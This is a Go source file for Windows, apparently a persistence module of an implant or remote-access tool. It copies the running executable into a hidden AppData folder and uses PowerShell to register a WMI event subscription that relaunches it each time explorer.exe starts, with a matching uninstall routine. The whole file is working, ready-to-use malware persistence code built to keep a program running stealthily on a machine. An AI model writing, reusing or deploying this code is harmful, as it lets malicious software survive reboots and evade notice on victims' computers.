//go:build windows && persist_wmi
// +build windows,persist_wmi

package persistence

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func init() {
	persistInstallFns = append(persistInstallFns, installWMIFull)
	persistUninstallFns = append(persistUninstallFns, uninstallWMI)
}

func installWMIFull(exePath string) error {
	targetPath, err := getAppDataTargetPath()
	if err != nil {
		return err
	}
	dir := filepath.Dir(targetPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}
	tryHideDirectory(dir)
	if !strings.EqualFold(filepath.Clean(exePath), filepath.Clean(targetPath)) {
		if err := replaceExecutable(exePath, targetPath); err != nil {
			return err
		}
	}
	return installWMI(targetPath)
}

func installWMI(targetPath string) error {
	filterName, consumerName := deriveWMINames(targetPath)
	safe := strings.ReplaceAll(targetPath, "'", "''")
	script := fmt.Sprintf(
		`$f = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance(); `+
			`$f.QueryLanguage = 'WQL'; `+
			`$f.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 `+
			`WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"; `+
			`$f.Name = '%s'; $f.EventNameSpace = 'root\cimv2'; $null = $f.Put(); `+
			`$c = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance(); `+
			`$c.Name = '%s'; $c.ExecutablePath = '%s'; $null = $c.Put(); `+
			`$b = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance(); `+
			`$b.Filter = "\\.\root\subscription:__EventFilter.Name='%s'"; `+
			`$b.Consumer = "\\.\root\subscription:CommandLineEventConsumer.Name='%s'"; `+
			`$null = $b.Put()`,
		filterName, consumerName, safe, filterName, consumerName)
	return runPowerShell(script)
}

func uninstallWMI() error {
	prefix := executablePrefix()
	return runPowerShell(
		`Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding ` +
			`-ErrorAction SilentlyContinue | Where-Object { $_.Filter -like "*` + prefix + `*" } | ` +
			`Remove-WmiObject -ErrorAction SilentlyContinue; ` +
			`Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer ` +
			`-ErrorAction SilentlyContinue | Where-Object { $_.Name -like "` + prefix + `*" } | ` +
			`Remove-WmiObject -ErrorAction SilentlyContinue; ` +
			`Get-WmiObject -Namespace root\subscription -Class __EventFilter ` +
			`-ErrorAction SilentlyContinue | Where-Object { $_.Name -like "` + prefix + `*" } | ` +
			`Remove-WmiObject -ErrorAction SilentlyContinue`)
}
